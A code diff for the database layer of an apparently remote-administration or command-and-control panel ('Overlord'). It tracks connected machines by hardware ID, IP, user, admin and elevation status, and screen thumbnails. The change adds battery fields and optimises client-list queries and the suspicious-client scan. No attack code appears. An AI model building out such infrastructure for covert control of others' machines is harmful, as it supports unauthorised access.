@@ -219,8 +219,8 @@ export function upsertClientRow(
 ) {
   const now = partial.lastSeen ?? Date.now();
   db.run(
-    `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, build_tag, built_by_user_id, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram, is_admin, elevation, permissions)
-     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(?, 0), ?, ?)
+    `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, build_tag, built_by_user_id, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram, battery_percent, battery_charging, is_admin, elevation, permissions)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(?, 0), ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        hwid=COALESCE(excluded.hwid, clients.hwid),
        role=COALESCE(excluded.role, clients.role),
@@ -246,6 +246,8 @@ export function upsertClientRow(
        cpu=COALESCE(excluded.cpu, clients.cpu),
        gpu=COALESCE(excluded.gpu, clients.gpu),
        ram=COALESCE(excluded.ram, clients.ram),
+       battery_percent=COALESCE(excluded.battery_percent, clients.battery_percent),
+       battery_charging=COALESCE(excluded.battery_charging, clients.battery_charging),
        is_admin=COALESCE(excluded.is_admin, clients.is_admin),
        elevation=COALESCE(excluded.elevation, clients.elevation),
        permissions=COALESCE(excluded.permissions, clients.permissions)
@@ -275,6 +277,8 @@ export function upsertClientRow(
     partial.cpu ?? null,
     partial.gpu ?? null,
     partial.ram ?? null,
+    partial.batteryPercent ?? null,
+    partial.batteryCharging !== undefined && partial.batteryCharging !== null ? (partial.batteryCharging ? 1 : 0) : null,
     partial.isAdmin !== undefined ? (partial.isAdmin ? 1 : 0) : null,
     partial.elevation ?? null,
     partial.permissions ? JSON.stringify(partial.permissions) : null,
@@ -618,6 +622,7 @@ export function markAllClientsOffline() {
 
 export const SUSPICIOUS_FLOOD_THRESHOLD = Math.max(2, Number(process.env.OVERLORD_SUSPICIOUS_FLOOD_THRESHOLD || 40));
 const SUSPICIOUS_IP_FLOOD_WINDOW_MS = Math.max(60_000, Number(process.env.OVERLORD_SUSPICIOUS_IP_WINDOW_MS || 300_000));
+const SUSPICIOUS_SCAN_MAX_CLIENTS = Math.max(0, Number(process.env.OVERLORD_SUSPICIOUS_SCAN_MAX_CLIENTS || 50_000));
 
 export function getFloodedHwids(threshold = SUSPICIOUS_FLOOD_THRESHOLD): Set<string> {
   const rows = db
@@ -853,6 +858,12 @@ export function listClients(filters: ListFilters): ListResult {
   }
 
   const whereSql = where.length ? `WHERE ${where.join(" AND ")}` : "";
+  const needsGroupJoinForFilter =
+    !!search ||
+    sort === "group_asc" ||
+    sort === "group_desc" ||
+    (groupFilter !== undefined && groupFilter !== "all");
+  const countJoinSql = needsGroupJoinForFilter ? "LEFT JOIN client_groups g ON g.id = c.group_id" : "";
 
   const orderBy = (() => {
     const online = "c.online DESC";
@@ -884,27 +895,48 @@ export function listClients(filters: ListFilters): ListResult {
   })();
 
   const totalRow = db
-    .query<{ c: number }>(`SELECT COUNT(*) as c FROM clients c LEFT JOIN client_groups g ON g.id = c.group_id ${whereSql}`)
+    .query<{ c: number }>(`SELECT COUNT(*) as c FROM clients c ${countJoinSql} ${whereSql}`)
     .get(...params) ?? { c: 0 };
   const onlineRow = db
     .query<{ c: number }>(
-      `SELECT COUNT(*) as c FROM clients c LEFT JOIN client_groups g ON g.id = c.group_id ${whereSql ? `${whereSql} AND c.online=1` : "WHERE c.online=1"}`,
+      `SELECT COUNT(*) as c FROM clients c ${countJoinSql} ${whereSql ? `${whereSql} AND c.online=1` : "WHERE c.online=1"}`,
     )
     .get(...params) ?? { c: 0 };
   const offset = (page - 1) * pageSize;
 
-  const rows = db
-    .query<any>(
-      `SELECT c.id, c.hwid, c.role, c.ip, c.host, c.os, c.arch, c.version, c.user, c.nickname, c.custom_tag as customTag, c.custom_tag_note as customTagNote, c.monitors, c.country, c.last_seen as lastSeen, c.online, c.ping_ms as pingMs, c.bookmarked, c.build_tag as buildTag, c.built_by_user_id as builtByUserId, c.enrollment_status as enrollmentStatus, c.public_key as publicKey, c.key_fingerprint as keyFingerprint, c.cpu, c.gpu, c.ram, c.is_admin as isAdmin, c.elevation, c.permissions, c.disconnect_reason as disconnectReason, c.disconnect_detail as disconnectDetail, c.group_id as groupId, g.name as groupName, g.color as groupColor, c.notifications_muted as notificationsMuted, c.deny_reason as denyReason
-       FROM clients c
-       LEFT JOIN client_groups g ON g.id = c.group_id
-       ${whereSql}
-       ${orderBy}
-       LIMIT ? OFFSET ?`,
-    )
-    .all(...params, pageSize, offset);
+  const clientFields =
+    "c.id, c.hwid, c.role, c.ip, c.host, c.os, c.arch, c.version, c.user, c.nickname, c.custom_tag as customTag, c.custom_tag_note as customTagNote, c.monitors, c.country, c.last_seen as lastSeen, c.online, c.ping_ms as pingMs, c.bookmarked, c.build_tag as buildTag, c.built_by_user_id as builtByUserId, c.enrollment_status as enrollmentStatus, c.public_key as publicKey, c.key_fingerprint as keyFingerprint, c.cpu, c.gpu, c.ram, c.battery_percent as batteryPercent, c.battery_charging as batteryCharging, c.is_admin as isAdmin, c.elevation, c.permissions, c.disconnect_reason as disconnectReason, c.disconnect_detail as disconnectDetail, c.group_id as groupId, c.notifications_muted as notificationsMuted, c.deny_reason as denyReason";
 
-  const { floodedHwids, floodedHardware, floodedIps } = getFloodSetsWithCache();
+  const rows = needsGroupJoinForFilter
+    ? db
+      .query<any>(
+        `SELECT ${clientFields}, g.name as groupName, g.color as groupColor
+         FROM clients c
+         LEFT JOIN client_groups g ON g.id = c.group_id
+         ${whereSql}
+         ${orderBy}
+         LIMIT ? OFFSET ?`,
+      )
+      .all(...params, pageSize, offset)
+    : db
+      .query<any>(
+        `WITH page_clients AS (
+           SELECT ${clientFields}
+           FROM clients c
+           ${whereSql}
+           ${orderBy}
+           LIMIT ? OFFSET ?
+         )
+         SELECT pc.*, g.name as groupName, g.color as groupColor
+         FROM page_clients pc
+         LEFT JOIN client_groups g ON g.id = pc.groupId`,
+      )
+      .all(...params, pageSize, offset);
+
+  const shouldScanSuspicious = SUSPICIOUS_SCAN_MAX_CLIENTS === 0 || totalRow.c <= SUSPICIOUS_SCAN_MAX_CLIENTS;
+  const suspiciousSets = shouldScanSuspicious
+    ? getFloodSetsWithCache()
+    : { floodedHwids: new Set<string>(), floodedHardware: new Set<string>(), floodedIps: new Set<string>() };
   const thumbnailSummaries = getThumbnailSummaries(rows.map((row: any) => row.id));
 
   const items = rows.map((c: any) => {
@@ -936,6 +968,8 @@ export function listClients(filters: ListFilters): ListResult {
       cpu: c.cpu || null,
       gpu: c.gpu || null,
       ram: c.ram || null,
+      batteryPercent: typeof c.batteryPercent === "number" ? c.batteryPercent : null,
+      batteryCharging: c.batteryCharging === null || c.batteryCharging === undefined ? null : c.batteryCharging === 1,
       isAdmin: c.isAdmin === 1,
       elevation: c.elevation || null,
       permissions: c.permissions ? (() => { try { return JSON.parse(c.permissions); } catch { return null; } })() : null,
@@ -948,7 +982,7 @@ export function listClients(filters: ListFilters): ListResult {
       denyReason: c.denyReason || null,
       hasThumbnail: thumbnail?.hasThumbnail ?? false,
       thumbnailVersion: thumbnail?.thumbnailVersion ?? 0,
-      suspiciousFlags: computeClientSuspiciousFlags(c, { floodedHwids, floodedHardware, floodedIps }),
+      suspiciousFlags: shouldScanSuspicious ? computeClientSuspiciousFlags(c, suspiciousSets) : [],
     };
   });
 
